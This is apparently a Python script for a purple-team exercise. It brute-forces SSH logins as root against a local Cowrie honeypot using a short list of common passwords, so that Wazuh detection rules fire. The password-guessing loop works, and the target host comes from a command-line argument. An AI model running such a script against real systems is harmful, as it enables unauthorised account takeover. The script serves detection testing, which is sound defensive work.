#!/usr/bin/env python3
"""
Controlled SSH brute-force against the LOCAL Cowrie honeypot.

This is a purple-team exercise against your own honeypot on localhost. It tries
a tiny wordlist so Wazuh records a burst of failed logins (rule 100104) followed
by one success (rule 100105). It is intentionally small, the point is to test
detection, not to crack anything.

Usage:
    pip install paramiko
    python brute_force.py                 # defaults to localhost:2222
    python brute_force.py 127.0.0.1 2222

Requires: paramiko  (pip install paramiko)
"""
import sys
import time
import socket

try:
    import paramiko
except ImportError:
    sys.exit("paramiko not installed. Run:  pip install paramiko")

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2222
USER = "root"

# Denied in cowrie/etc/userdb.txt -> these FAIL, then hunter2 SUCCEEDS.
WORDLIST = [
    "admin", "password", "123456", "12345", "root",
    "toor", "qwerty", "letmein", "changeme", "000000",
    "hunter2",   # this one succeeds
]


def try_login(password: str) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            HOST, port=PORT, username=USER, password=password,
            allow_agent=False, look_for_keys=False, timeout=8, banner_timeout=8,
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.error, paramiko.SSHException) as e:
        print(f"  ! connection issue: {e}")
        return False


def main():
    print(f"[*] Brute-forcing {USER}@{HOST}:{PORT} with {len(WORDLIST)} passwords\n")
    for pw in WORDLIST:
        ok = try_login(pw)
        status = "SUCCESS <==" if ok else "failed"
        print(f"  {USER}:{pw:<10} -> {status}")
        if ok:
            print(f"\n[+] Valid credential found: {USER}:{pw}")
            break
        time.sleep(0.5)   # gentle pacing
    print("\n[*] Done. Check Wazuh: filter rule.groups: cowrie")


if __name__ == "__main__":
    main()
